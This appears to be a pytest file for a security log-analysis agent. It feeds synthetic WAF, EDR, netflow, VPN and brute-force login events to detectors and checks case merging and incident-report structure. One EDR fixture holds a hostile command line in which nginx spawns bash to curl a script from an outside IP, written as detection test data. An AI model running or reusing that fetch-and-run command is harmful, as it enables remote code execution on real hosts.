"""Helper function tests for log analysis detectors.
日志分析检测器辅助函数测试。"""

from __future__ import annotations

import json

from agent_py_agent.agent.log_analysis.analytics.detectors import run_soft_detectors
from agent_py_agent.agent.log_analysis.cases.case_store import CaseStore
from agent_py_agent.agent.log_analysis.models import EvidenceRef, Finding
from agent_py_agent.agent.log_analysis.reports import (
    first_response_report_content,
    forensic_package_content,
)
from agent_py_agent.agent.log_analysis.security.correlation import build_route_draft


# ── Shared event fixtures ─────────────────────────────────────────────────────

_WAF_EVENT = {
    "event_id": "waf-1",
    "event_time": "2026-04-30T10:00:00Z",
    "source_id": "waf-prod",
    "source_product": "waf",
    "event_class": "alert",
    "event_action": "detected",
    "severity": "high",
    "alert_type": "web_attack",
    "threat_name": "generic command execution",
    "uri": "/upload.php",
    "attacker_ip": "198.51.100.10",
    "victim_ip": "10.0.0.5",
    "raw_ref": "raw-waf:line-1",
}

_EDR_EVENT = {
    "event_id": "edr-1",
    "event_time": "2026-04-30T10:02:00Z",
    "source_id": "edr-prod",
    "source_product": "edr",
    "event_class": "process",
    "event_action": "process_start",
    "victim_ip": "10.0.0.5",
    "host": "web-01",
    "parent_process_name": "nginx",
    "process_name": "bash",
    "cmdline": "bash -c curl http://203.0.113.77/a.sh",
    "raw_ref": "raw-edr:line-7",
}

_NETFLOW_EVENT = {
    "event_id": "net-1",
    "event_time": "2026-04-30T10:03:00Z",
    "source_id": "netflow-prod",
    "source_product": "netflow",
    "event_class": "network",
    "event_action": "connect",
    "src_ip": "10.0.0.5",
    "dst_ip": "203.0.113.77",
    "dst_port": 443,
    "rare": True,
    "raw_ref": "raw-net:line-2",
}

_VPN_LOGIN_EVENT = {
    "event_id": "vpn-1",
    "event_time": "2026-04-30T11:00:00Z",
    "source_id": "vpn-prod",
    "source_product": "vpn",
    "event_class": "auth",
    "event_action": "login",
    "event_outcome": "success",
    "user": "alice",
    "src_ip": "198.51.100.30",
    "country": "ZZ",
    "new_geo": True,
    "raw_ref": "raw-vpn:line-1",
}


def _auth_failure_events() -> list[dict]:
    """Build auth failure events for bob (used in bruteforce tests)."""
    return [
        {
            "event_id": f"auth-fail-{index}",
            "event_time": f"2026-04-30T11:0{index}:00Z",
            "source_id": "sso-prod",
            "source_product": "sso",
            "event_class": "auth",
            "event_action": "login",
            "event_outcome": "failure",
            "user": "bob",
            "src_ip": "198.51.100.44",
            "raw_ref": f"raw-sso:line-{index}",
        }
        for index in range(5)
    ]


def _auth_success_event() -> dict:
    """Build auth success event for bob."""
    return {
        "event_id": "auth-success",
        "event_time": "2026-04-30T11:06:00Z",
        "source_id": "sso-prod",
        "source_product": "sso",
        "event_class": "auth",
        "event_action": "login",
        "event_outcome": "success",
        "user": "bob",
        "src_ip": "198.51.100.44",
        "host": "app-01",
        "raw_ref": "raw-sso:line-9",
    }


def _events() -> list[dict]:
    """Full event set: WAF alert, EDR process, netflow, VPN login, bruteforce sequence, success."""
    return [
        _WAF_EVENT,
        _EDR_EVENT,
        _NETFLOW_EVENT,
        _VPN_LOGIN_EVENT,
    ] + _auth_failure_events() + [_auth_success_event()]


def test_findings_merge_to_case_and_low_confidence_only_records(tmp_path):
    """LLM: Tests that findings merge into cases and low-confidence findings are only recorded, not auto-promoted."""
    store = CaseStore(tmp_path, min_case_confidence=0.6)
    findings = run_soft_detectors(_events())
    store.record_findings(findings)

    cases = store.list_cases()
    merged = max(cases, key=lambda item: len(item.finding_refs))
    assert len(merged.finding_refs) >= 3
    assert "10.0.0.5" in merged.entities["victim_ip"]
    assert any(item["detector_id"] == "waf_attack_success_candidate" for item in merged.attributes["finding_summaries"])
    assert any(isinstance(query, dict) and query.get("purpose") for query in merged.next_queries)

    low = Finding(
        finding_id="finding-low",
        detector_id="low_signal",
        risk_score=0.2,
        confidence=0.2,
        evidence_refs=[EvidenceRef(evidence_id="raw-low:line-1")],
        hypothesis="low confidence only",
        gaps=["needs more evidence"],
        next_queries=["query more"],
    )
    assert store.record_finding(low) is None
    assert store.store.get_finding("finding-low") is not None


def test_route_and_reports_separate_facts_inferences_gaps(tmp_path):
    """LLM: Tests that route draft and reports properly separate facts, inferences, and gaps."""
    store = CaseStore(tmp_path)
    findings = run_soft_detectors(_events())
    store.record_findings(findings)
    case = max(store.list_cases(), key=lambda item: len(item.finding_refs))

    route = build_route_draft(case)
    assert route.entry_candidates
    assert route.timeline
    assert route.impacted_entities
    assert route.facts
    assert route.inferences
    assert route.gaps
    assert route.next_queries

    report = first_response_report_content(case, route)
    assert "## Facts" in report
    assert "## Inferences" in report
    assert "## Gaps" in report

    package = json.loads(forensic_package_content(case, route, frozen=True))
    assert package["frozen"] is True
    assert package["facts"]
    assert package["inferences"]
    assert package["gaps"]
    assert package["evidence_refs"]


def test_route_and_forensic_package_filter_all_findings_to_case_refs(tmp_path):
    """LLM: Tests that route draft and forensic package filter findings to only those referenced by the case."""
    store = CaseStore(tmp_path, min_case_confidence=0.6)
    store.record_findings(run_soft_detectors(_events()))
    cases = store.list_cases()
    case = next(item for item in cases if any("alice" in values for values in item.entities.values()))
    all_findings = store.load_findings()

    route = build_route_draft(case, findings=all_findings)
    assert route.entry_candidates
    assert {item["detector_id"] for item in route.entry_candidates} == {"vpn_new_geo_login"}
    assert all("198.51.100.10" not in values for values in route.impacted_entities.values())

    package = json.loads(forensic_package_content(case, findings=all_findings, frozen=True))
    assert {finding["finding_id"] for finding in package["findings"]} == set(case.finding_refs)
